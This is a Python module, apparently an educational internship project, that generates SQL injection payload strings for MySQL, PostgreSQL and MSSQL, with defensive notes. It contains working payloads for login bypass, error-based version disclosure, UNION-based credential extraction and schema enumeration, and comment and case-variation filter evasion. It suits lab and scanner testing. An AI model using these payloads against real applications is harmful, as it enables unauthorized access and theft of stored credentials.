"""
SQL Injection Payload Module - Educational Template Generator (Simulation Mode)

Reference: OWASP SQL Injection
https://owasp.org/www-community/attacks/SQL_Injection

Scope compliance:
- Generates SQLi string examples for labs/scanners (Error-based, Union-based)
- Blind SQLi (boolean/time-based) is DESCRIPTION-ONLY (no concrete payload strings)
- Includes DB type selector (MySQL, PostgreSQL, MSSQL)
- Includes comment-based bypass examples
- Includes case variation logic (mixed-case keyword variants)
- No live database interaction
"""


class SQLiPayloadGenerator:
    """Generate educational SQL injection payload templates (no DB interaction)."""

    SUPPORTED_DBS = ("mysql", "postgresql", "mssql")

    def __init__(self, db_type: str = "mysql", case_variants: bool = True):
        self.db_type = (db_type or "mysql").lower()
        if self.db_type not in self.SUPPORTED_DBS:
            raise ValueError(f"Unsupported db_type '{db_type}'. Use one of: {', '.join(self.SUPPORTED_DBS)}")
        self.case_variants = case_variants
        self.comment_chars = self._get_comment_chars()

    # -----------------------------
    # Utilities
    # -----------------------------
    def _get_comment_chars(self):
        comments = {
            "mysql": ["--+", "#", "/* */"],
            "postgresql": ["--", "/* */"],
            "mssql": ["--", "/* */"],
        }
        return comments[self.db_type]

    def _mix_case(self, s: str) -> str:
        """
        Deterministic mixed-case transformation for 'case variation logic'.
        Example: 'UNION SELECT' -> 'UnIoN SeLeCt'
        """
        out = []
        upper = True
        for ch in s:
            if ch.isalpha():
                out.append(ch.upper() if upper else ch.lower())
                upper = not upper
            else:
                out.append(ch)
        return "".join(out)

    def _kw(self, keyword: str):
        """
        Return keyword variants: normal + mixed-case (optional).
        """
        if not self.case_variants:
            return [keyword]
        mixed = self._mix_case(keyword)
        if mixed == keyword:
            return [keyword]
        return [keyword, mixed]

    def _item(self, *, subtype, payload, description, bypass_explanation, defensive_notes, note=None):
        return {
            "type": "SQLi",
            "subtype": subtype,
            "db_type": self.db_type,
            "payload": payload,
            "description": description,
            "bypass_explanation": bypass_explanation,
            "defensive_notes": defensive_notes,
            **({"note": note} if note else {}),
        }

    # -----------------------------
    # Public API
    # -----------------------------
    def generate_all_types(self):
        payloads = []
        payloads.extend(self._generate_error_based())
        payloads.extend(self._generate_union_based())
        payloads.extend(self._generate_blind_boolean_description_only())
        payloads.extend(self._generate_blind_time_description_only())
        payloads.extend(self._generate_bypass_techniques())
        return payloads

    # -----------------------------
    # Error-based (strings allowed)
    # -----------------------------
    def _generate_error_based(self):
        c0 = self.comment_chars[0]

        base = [
            self._item(
                subtype="Error-based",
                payload="' OR '1'='1",
                description="Classic tautology (authentication bypass attempt)",
                bypass_explanation="Creates an always-true predicate that may alter WHERE clause logic.",
                defensive_notes="Use parameterized queries (prepared statements). Never concatenate user input into SQL.",
            ),
            self._item(
                subtype="Error-based",
                payload=f"' OR 1=1{c0}",
                description="Tautology with trailing comment to ignore remaining query",
                bypass_explanation="Comment syntax truncates the original SQL statement after injection.",
                defensive_notes="Prepared statements render comment tokens harmless. Also normalize input and enforce strict validation.",
            ),
            self._item(
                subtype="Error-based",
                payload=f"admin'{c0}",
                description="Comment-based login bypass shape (user field truncation)",
                bypass_explanation="Closes a string and comments out the password check in vulnerable concatenated queries.",
                defensive_notes="Prepared statements + consistent error handling. Avoid distinct login error messages.",
            ),
        ]

        # DB-specific error disclosure examples (strings allowed)
        if self.db_type == "mysql":
            base.append(
                self._item(
                    subtype="Error-based",
                    payload="' AND extractvalue(1,concat(0x7e,version())) --+",
                    description="MySQL error-based disclosure via XML function (version in error)",
                    bypass_explanation="Forces an error message that may include DB data if verbose errors are returned.",
                    defensive_notes="Disable verbose SQL errors in production; log server-side only. Primary defense remains parameterization.",
                )
            )
        elif self.db_type == "mssql":
            base.append(
                self._item(
                    subtype="Error-based",
                    payload="' AND 1=CONVERT(int,@@version) --",
                    description="MSSQL type-conversion error disclosure attempt",
                    bypass_explanation="Provokes a conversion error that may reveal version details with verbose error pages.",
                    defensive_notes="Use custom error pages and parameterization. Don’t return stack traces/DB errors to clients.",
                )
            )
        elif self.db_type == "postgresql":
            base.append(
                self._item(
                    subtype="Error-based",
                    payload="' || (SELECT version()) || '",
                    description="PostgreSQL string concatenation disclosure shape (depends on context)",
                    bypass_explanation="Shows how concatenation operators differ by DB; can reveal DB info if reflected.",
                    defensive_notes="Parameterize and avoid reflecting DB outputs. Minimize privilege and disable verbose errors.",
                )
            )

        return base

    # -----------------------------
    # Union-based (strings allowed)
    # -----------------------------
    def _generate_union_based(self):
        # provide keyword variants to satisfy "case variation logic"
        union_variants = self._kw("UNION")
        select_variants = self._kw("SELECT")

        payloads = []

        for u in union_variants:
            for s in select_variants:
                payloads.append(
                    self._item(
                        subtype="Union-based",
                        payload=f"' {u} {s} NULL,NULL,NULL{self.comment_chars[0]}",
                        description="Determine column count using NULL placeholders (union-based probing)",
                        bypass_explanation="NULL is compatible with most column data types, easing union alignment.",
                        defensive_notes="Prepared statements prevent UNION injection. Also validate inputs against expected format and use least privilege.",
                    )
                )

        # One “classic” data-extraction shape (still educational strings)
        payloads.append(
            self._item(
                subtype="Union-based",
                payload=f"' UNION SELECT username,password FROM users{self.comment_chars[0]}",
                description="Illustrative union-based extraction attempt (lab/scanner style)",
                bypass_explanation="UNION combines attacker-chosen SELECT output with the original query result set.",
                defensive_notes="Least privilege + parameterization. Application DB user should not access sensitive credential tables.",
            )
        )

        # DB-specific union examples (strings allowed)
        if self.db_type == "mysql":
            payloads.extend(
                [
                    self._item(
                        subtype="Union-based",
                        payload="' UNION SELECT NULL,concat(user(),0x3a,database())--+",
                        description="MySQL: disclose current user and database (illustrative)",
                        bypass_explanation="Concatenates metadata into one output column.",
                        defensive_notes="Parameterize queries. Restrict metadata exposure where feasible and avoid reflecting sensitive info.",
                    ),
                    self._item(
                        subtype="Union-based",
                        payload="' UNION SELECT table_name,NULL FROM information_schema.tables--+",
                        description="MySQL: enumerate tables via information_schema (illustrative)",
                        bypass_explanation="Targets metadata tables to map schema when injection exists.",
                        defensive_notes="Least privilege and parameterization. Don’t grant unnecessary metadata access to app accounts.",
                    ),
                ]
            )
        elif self.db_type == "postgresql":
            payloads.append(
                self._item(
                    subtype="Union-based",
                    payload="' UNION SELECT NULL,version()--",
                    description="PostgreSQL: version disclosure (illustrative)",
                    bypass_explanation="Uses DB function output in union results.",
                    defensive_notes="Prepared statements. Minimize information disclosure and limit DB account privileges.",
                )
            )
        elif self.db_type == "mssql":
            payloads.append(
                self._item(
                    subtype="Union-based",
                    payload="' UNION SELECT NULL,@@version--",
                    description="MSSQL: version disclosure (illustrative)",
                    bypass_explanation="Uses system variable in union results.",
                    defensive_notes="Prepared statements + least privilege. Avoid returning DB errors and internal details.",
                )
            )

        return payloads

    # -----------------------------
    # Blind SQLi: DESCRIPTION ONLY (no concrete payload strings)
    # -----------------------------
    def _generate_blind_boolean_description_only(self):
        return [
            self._item(
                subtype="Blind Boolean-based (description-only)",
                payload="[[DESCRIPTION_ONLY]]",
                description=(
                    "Concept: send two logically different predicates (TRUE vs FALSE) and compare response behavior "
                    "(content differences, status code changes, redirects, etc.)."
                ),
                bypass_explanation=(
                    "Attackers infer truth values by observing app behavior. Automated tools may binary-search characters/bits."
                ),
                defensive_notes="Use prepared statements. Ensure consistent responses and error handling. Add rate limiting and anomaly detection.",
                note="No concrete boolean payload strings are provided by design (per internship scope).",
            ),
        ]

    def _generate_blind_time_description_only(self):
        return [
            self._item(
                subtype="Blind Time-based (description-only)",
                payload="[[DESCRIPTION_ONLY]]",
                description=(
                    "Concept: trigger a measurable server-side delay only when a condition is true, then infer data from timing."
                ),
                bypass_explanation=(
                    "Attackers compare baseline latency vs induced delay. Requires many requests; easy to spot with monitoring."
                ),
                defensive_notes="Prepared statements. Monitor latency anomalies, enforce timeouts, rate limit, and add WAF/IDS correlation rules.",
                note="No DB-specific sleep/WAITFOR payload strings are provided by design (per internship scope).",
            ),
        ]

    # -----------------------------
    # Bypass techniques (strings allowed + case variants)
    # -----------------------------
    def _generate_bypass_techniques(self):
        c0 = self.comment_chars[0]
        payloads = []

        # Comment-based bypass
        payloads.append(
            self._item(
                subtype="Bypass Technique",
                payload="' OR '1'='1' /*",
                description="Multiline comment truncation shape",
                bypass_explanation="If the query parser accepts the comment, remaining SQL may be ignored depending on context.",
                defensive_notes="Prepared statements. Avoid building SQL via concatenation. Normalize and validate input.",
            )
        )

        # Inline comment replacing whitespace (works best as an illustrative string)
        payloads.append(
            self._item(
                subtype="Bypass Technique",
                payload=f"admin'/* */OR/* */1=1{c0}",
                description="Inline comment tokens used as whitespace substitute (illustrative)",
                bypass_explanation="Some naive filters block spaces or keywords but fail with tokenized comments.",
                defensive_notes="Allowlist validation + prepared statements. Keyword blacklists are brittle.",
            )
        )

        # MySQL-specific hash comment only when db is mysql
        if self.db_type == "mysql":
            payloads.append(
                self._item(
                    subtype="Bypass Technique",
                    payload="' OR 1=1#",
                    description="MySQL hash comment (illustrative)",
                    bypass_explanation="Alternative comment syntax can bypass filters that only look for '--'.",
                    defensive_notes="Normalize comment forms before validation. Primary defense remains prepared statements.",
                )
            )

        # UNION ALL variant + case-variation demonstration
        for u in self._kw("UNION ALL"):
            for s in self._kw("SELECT"):
                payloads.append(
                    self._item(
                        subtype="Bypass Technique (case variation)",
                        payload=f"' {u} {s} NULL{c0}",
                        description="Case-variant UNION/SELECT to demonstrate evasion of case-sensitive filters",
                        bypass_explanation="SQL keywords are typically case-insensitive; naive filters may not normalize case.",
                        defensive_notes="Normalize case before any inspection. Better: avoid keyword filtering and use parameterization.",
                    )
                )

        return payloads
